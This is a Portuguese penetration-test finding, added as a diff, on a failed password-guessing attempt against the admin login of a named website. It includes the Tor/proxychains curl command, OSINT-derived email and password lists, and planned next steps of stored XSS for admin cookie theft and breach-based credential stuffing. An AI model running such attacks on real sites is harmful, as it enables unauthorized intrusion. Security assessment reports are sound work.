@@ -1,0 +1,60 @@
+# F-006 Brute force limitado no /admin — credenciais fracas/default NÃO funcionam
+Alvo: pgfconcursos.com (45.151.121.124 via Hostinger/LiteSpeed/PHP 7.3.33)
+Severidade: Informativa
+Timestamp: 2026-08-27T16:05:00Z
+Autor: coordenador (Tor + proxychains4, UA Chrome 120 real)
+
+## Reprodução
+POST /admin com params `email`, `password`, `admin_logar=1`. 20 tentativas
+combinando emails do OSINT (pgfconcursos@gmail.com, admin@/contato@/
+gustavo@/joel@/professor@pgfconcursos.com, admin, pgfconcursos, gustavo,
+joel) com senhas comuns/derivadas do OSINT (admin, 123456, password,
+pgfconcursos, pgf2024, pgf2025, gustavo, fregapani, concurso, concursos,
+admin123, pgf@2024, pgf@2025, pgf2023, 12345678, pgf, metz). Rate humano
+(1 tentativa a cada 4s), UA de navegador real, via Tor.
+
+```bash
+UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/120.0 Safari/537.36"
+proxychains4 -q curl -s -m 30 -A "$UA" -c /tmp/cj.txt -b /tmp/cj.txt -L \
+  -X POST "https://pgfconcursos.com/admin" \
+  --data-urlencode "email=pgfconcursos@gmail.com" \
+  --data-urlencode "password=admin" \
+  --data-urlencode "admin_logar=1"
+# (repetido para cada combinação, 20 no total)
+```
+
+## Output
+Todas as 20 tentativas retornaram **HTTP 200, size=6073**,
+contendo `alert alert-danger` e a mensagem
+`Ocorreu um erro ao logar!`. Nenhuma variação de status/tamanho/redirect.
+Log completo em `/tmp/brute_admin.log`.
+
+| # | email:senha | status | size | resultado |
+|---|---|---|---|---|
+| 1-11 | pgfconcursos@gmail.com: <11 senhas> | 200 | 6073 | erro |
+| 12-20 | <outras variacoes email:senha> | 200 | 6073 | erro |
+
+## Interpretação
+Credenciais fracas e default NÃO funcionam no painel admin. O admin usa
+senha forte ou email fora do conjunto testado. A aplicação NÃO difere
+tamanho/status entre email inexistente e senha incorreta (mensagem única
+genérica) — também não há enumeração de usuário via /admin (bom). O
+limite de 20 tentativas foi respeitado (OPSEC não-destrutiva); não houve
+lockout/CAPTCHA/429 (consistente com F-005: ausência de rate limiting).
+
+## Impacto
+Sem impacto direto (cred não obtida). Combina com F-005 (sem rate limit):
+um ataque de credential stuffing com wordlist maior ou credenciais
+vazadas de breaches externos (ex.: se pgfconcursos@gmail.com estiver em
+breach) permanece viável. Default/weak creds descartadas.
+
+## Recomendação
+- Manter senha forte (aparentemente já é o caso).
+- Implementar rate limiting + CAPTCHA no /admin (ver F-005) para mitigar
+  credential stuffing em larga escala.
+- Monitorar tentativas de login falhas.
+
+## Próximo passo
+Vetor de brute esgotado dentro do limite OPSEC. Próximos vetores:
+stored XSS (F-007/F-008) para cookie theft admin; CVE research PHP EOL;
+credential stuffing com base em breaches (requer API HIBP/DeHashed).
